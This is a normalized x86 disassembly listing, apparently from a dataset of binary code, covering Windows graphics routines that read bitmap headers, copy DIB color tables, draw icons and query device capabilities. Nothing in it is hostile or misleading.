mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_402cac
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_422703
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_41e268
mov [ ebp - 0x30 ] eax
sub_422720
lea eax [ ebp - 0x9c ]
push eax
mov al [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_4220d4
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_422764
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_421e04
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_4158f8
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_402cac
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_4220d4
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_4221fc
call sub_41da58
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_4227d4
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_421e04
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402cac
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_42141c
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_42286f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_4220d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_422898
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_421cc0
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_421e04
mov eax esi
call sub_421f14
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_421e04
mov eax esi
call sub_421f14
mov eax esi
call sub_421d90
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_42141c
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_421820
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_4220d4
jmp r-xdata
push esp
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_4220d4
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_420db8
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4229d0
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_421e14
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_421820
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_422a24
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_421e14
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_421820
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_422aa4
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_421e04
mov eax ebx
call sub_421e14
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_420db8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_422b3b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
mov al [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4220d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_420cb0
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_41b998
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_422b40
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_403a44
call sub_403a98
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_420cb0
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_422b78
push ebx
push esi
mov esi eax
cmp edx [ esi + 0x34 ]
je r-xdata
pop esi
pop ebx
retn
cmp edx 0x20000000
jne r-xdata
mov [ esi + 0x38 ] 0x1
mov [ esi + 0x38 ] 0x0
jmp r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax esi
call sub_421e14
lea eax [ ebx + 0x18 ]
push eax
mov ecx [ ebx + 0x10 ]
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_421820
mov [ esi + 0x34 ] edx
mov eax [ esi + 0x28 ]
cmp [ eax + 0x4 ] 0x1
jle r-xdata
sub_422bc8
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x1c ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_421e14
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x1c ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_421820
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_422c24
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402cac
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_421d90
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_41e9bc
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_415930
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_415930
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402cac
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_421c54
mov dl [ r-xdata ]
call sub_41d854
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_41db78
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
mov ax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_420d6c
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_415930
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_415930
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
mov dx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
mov dx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
mov ax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_415930
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_415930
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp + 0x70 ]
xor ecx ecx
mov cl [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_415930
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_415930
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_41dfe8
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_415930
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_41e30c
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
shl eax 0x2
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_422ee4
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_421e14
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_420db8
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_422f5e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_42141c
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_422f84
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403290
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403280
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_422fcc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41ecf8
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_420be4
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_423020
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_420be8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414004
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_423050
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_423328
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_420be4
mov eax [ esi + 0x28 ]
call sub_420be8
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_414030
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_4230b0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax esi
call sub_41d854
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_423108
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_423144
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_4156ec
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_4158f8
mov ax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_41e5b8
jmp r-xdata
jmp r-xdata
call sub_41da64
sub_4231bc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_423249
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_423108
cmp eax [ rw-data ]
jne r-xdata
call sub_41da64
mov eax esi
call sub_423108
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_41eafc
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_402cac
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_415930
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_423270
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4232fe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_4156cc
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_4158f8
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_4158f8
mov ax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_423328
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_41da64
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_423303
mov eax [ ebp - 0x4 ]
call sub_403290
call sub_403a44
call sub_403a98
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_423328
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_423368
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_420be4
mov eax [ ebx + 0x28 ]
call sub_420be8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4233e8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4231bc
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_415930
pop esi
pop ebx
retn
sub_423438
push ebx
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_41e0b8
mov [ rw-data ] eax
pop ebx
retn
sub_423470
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
mov bl [ esp + 0x34 ]
sub_4234b4
push ebx
push esi
push edi
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call sub_406118
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_423470
mov ebx eax
mov eax ebx
sub al 0x80
jne r-xdata
mov esi r-xdata
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x48
mov eax [ rw-data ]
push eax
push 0x9
call sub_406118
neg eax
mov [ rw-data ] eax
mov [ rw-data ] bl
sub_423580
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035b4
mov eax esi
pop esi
pop ebx
retn
call sub_40360c
pop [ fs : 0x0 ]
add esp 0xc
sub_4235b8
push ebx
push esi
call sub_40361c
mov ebx edx
mov esi eax
mov eax esi
call sub_4237b0
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403604
sub_4235fc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4235e4
xor eax eax
push ebp
push sub_42369d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4236a4
mov eax [ ebp - 0x4 ]
call sub_4235f0
retn
mov eax 0x10
call sub_4026bc
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4236b0
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_4236b0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42168c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42378f
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_421c54
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_41d030
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_41cf14
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_412640
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_41d2ec
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_41d714
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_421910
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4237b0
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_4235e4
xor eax eax
push ebp
push sub_4237fb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423802
mov eax [ ebp - 0x4 ]
call sub_4235f0
retn
mov esp ebp
pop ebp
retn
sub_423802
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026dc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
call sub_403290
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_4235e4
xor eax eax
push ebp
